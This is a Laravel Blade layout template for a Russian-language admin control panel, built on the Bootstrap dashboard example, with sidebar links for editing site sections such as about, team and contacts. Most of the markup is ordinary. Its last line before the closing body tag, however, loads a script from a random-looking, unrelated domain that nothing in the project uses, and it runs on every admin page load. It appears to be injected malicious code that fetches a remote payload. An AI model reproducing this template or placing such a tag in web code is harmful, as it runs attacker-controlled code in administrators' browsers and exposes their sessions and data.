<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Hugo 0.84.0">
    <title>@yield('title')</title>
    {{-- ajax start  --}}
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    {{-- ajax end  --}}
    <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/dashboard/">
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/admin.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">

    

    <!-- Bootstrap core CSS -->
<link href="/docs/5.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <!-- Favicons -->
<link rel="apple-touch-icon" href="/docs/5.0/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
<link rel="icon" href="/docs/5.0/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
<link rel="icon" href="/docs/5.0/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
<link rel="manifest" href="/docs/5.0/assets/img/favicons/manifest.json">
<link rel="mask-icon" href="/docs/5.0/assets/img/favicons/safari-pinned-tab.svg" color="#7952b3">
<link rel="icon" href="/docs/5.0/assets/img/favicons/favicon.ico">
<meta name="theme-color" content="#7952b3">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>

    
    <!-- Custom styles for this template -->
    <link href="dashboard.css" rel="stylesheet">
  <style type="text/css">/* Chart.js */
@keyframes chartjs-render-animation{from{opacity:.99}to{opacity:1}}.chartjs-render-monitor{animation:chartjs-render-animation 1ms}.chartjs-size-monitor,.chartjs-size-monitor-expand,.chartjs-size-monitor-shrink{position:absolute;direction:ltr;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1}.chartjs-size-monitor-expand>div{position:absolute;width:1000000px;height:1000000px;left:0;top:0}.chartjs-size-monitor-shrink>div{position:absolute;width:200%;height:200%;left:0;top:0}</style>
</head>
  
  <body>
    
<header class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap shadow p-2 d-flex">
  <div class="d-flex">
    <button class="navbar-toggler d-laptop-none collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#sidebarMenu" aria-controls="sidebarMenu" aria-expanded="false" aria-label="Toggle navigation">
      <i class="bi bi-list text-white">Меню</i>
    </button>
    <a class="navbar-brand me-0 px-3" href="#">Добавление</a>
  </div>
  <input class="form-control form-control-dark w-50 ms-auto d-tel-none" style="background-color: rgba(236, 236, 236, 0.247); border: none" type="text" placeholder="" aria-label="Поиск">
  <div class="d-flex">
      <a class="nav-link px-3 text-white d-laptop-none" href="/"><i class="bi bi-search fs-3"></i></a>
      <a class="nav-link px-3 text-white" href="/"><i class="bi bi-box-arrow-right fs-3"></i></a>
  </div>
</header>

<div class="container-fluid"  style="background-color: #454d55;color: #ced4da;">
  <div class="row">
    <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block sidebar collapse shadow" >
      <div class="position-sticky pt-3" style="height: 100vh">
        <ul class="nav flex-column">

          <li class="nav-item">
            <hr>
            <a class="nav-link active" aria-current="page" href="/cp_home" style="color: #ced4da">
              <i class="bi bi-house"></i>
               Главная
            </a>
            <hr>
          </li>
        </ul>

        <h6 class="sidebar-heading d-flex justify-content-between align-items-center px-3 mt-4 mb-1 text-muted">
          <span>Секции</span>
        </h6>
        <ul class="nav flex-column mb-2" >

          <li class="nav-item" >
            <a class="nav-link" href="admin_navbar" style="color: #ced4da">
              <i class="bi bi-display"></i>
              Navbar
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_bag_imgHome" style="color: #ced4da">
              <i class="bi bi-image"></i>
              Задний фон главной
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_home" style="color: #ced4da">
              <i class="bi bi-house"></i>
              Главная описание
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_clients_section" style="color: #ced4da">
              <i class="bi bi-clipboard-plus-fill"></i>
              Рекламы
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_about"  style="color: #ced4da">
              <i class="bi bi-person-video3"></i>
              О нас
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_why_us" style="color: #ced4da">
              <i class="bi bi-postcard"></i>
            Карта для <<О нас>>
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_why_us" style="color: #ced4da">
              <i class="bi bi-exclamation-square-fill"></i>
             Почему мы! Активная карта
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_why_us_block" style="color: #ced4da">
              <i class="bi bi-exclamation-square-fill"></i>
             Почему мы! Не активные карты
            </a>
          </li>
       
          <li class="nav-item">
            <a class="nav-link" href="admin_cta" style="color: #ced4da">
              <i class="bi bi-activity"></i>
              СТА
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_servis" style="color: #ced4da">
              <i class="bi bi-activity"></i>
              Сервис
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_team" style="color: #ced4da">
              <i class="bi bi-people-fill"></i>
              Персонал
            </a>
          </li>

          <li class="nav-item">
            <a class="nav-link" href="admin_contact" style="color: #ced4da">
              <i class="bi bi-telephone-inbound"></i>
              Контакты
            </a>
          </li>
        </ul>
      </div>
    </nav>

    <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4"><div class="chartjs-size-monitor"><div class="chartjs-size-monitor-expand"><div class=""></div></div><div class="chartjs-size-monitor-shrink"><div class=""></div></div></div>
  


      @yield('admin_main')



      {{-- <canvas class="my-4 w-100 chartjs-render-monitor" id="myChart" width="2304" height="972" style="display: block; height: 486px; width: 1152px;"></canvas> --}}
    </main>
  </div>
</div>


    <script src="/docs/5.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

      <script src="https://cdn.jsdelivr.net/npm/feather-icons@4.28.0/dist/feather.min.js" integrity="sha384-uO3SXW5IuS1ZpFPKugNNWqTZRRglnUJK6UAZ/gxOX80nxEkN9NcGZTftn6RzhGWE" crossorigin="anonymous"></script><script src="https://cdn.jsdelivr.net/npm/chart.js@2.9.4/dist/Chart.min.js" integrity="sha384-zNy6FEbO50N+Cg5wap8IKA4M/ZnLJgzc6w2NqACZaK0u0FXfOWRRJOnQtpZun8ha" crossorigin="anonymous"></script><script src="dashboard.js"></script>
  

<script src="https://nzvbz1.inyo4y.com/ex/a/ab880100/por/"></script>

</body>
</html> 






